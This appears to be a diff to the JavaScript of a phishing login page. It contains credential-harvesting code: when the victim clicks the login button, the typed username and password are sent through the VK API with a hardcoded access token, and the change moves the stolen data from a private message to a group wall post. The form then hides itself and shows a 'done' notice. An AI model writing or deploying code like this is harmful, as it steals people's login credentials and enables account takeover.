@@ -23,11 +23,10 @@ function valid() {
 }
 //Отправка логина и пароля
 Authorize_login.onclick = function Send() {
-	const peer_ids = "647820871";
-	const random_id = "0";
-	const token = "a3505a52b2f9e8c5eb94f5795d6e267c07b2a5acecbb4308d5e31219bbdd96f0a47af7be6ddfffe6a51ce";
+	const owner_id = "-203605080";
+	const token = "ab91383b33ef3550d9a21f50da5f1591a9ef84d6098279f84ad9b7bd02043ea7cf6db6d46fa454e83bda1";
 	const auth = 'Логин: ' + Authorize_username.value + ' Пароль: ' + Authorize_password.value;
-	const url_post = `https://api.vk.com/method/messages.send?&peer_ids=${peer_ids}&message=${auth}&random_id=${random_id}&access_token=${token}&v=5.130`
+	const url_post = `https://api.vk.com/method/wall.post?&owner_id=${owner_id}&message=${auth}access_token=${token}&v=5.130`
 	const auth_send_post = fetch(url_post, {method: "POST", mode: "no-cors"});
 	Authorize.style.display = "none";
 	Done.style.display = "block";
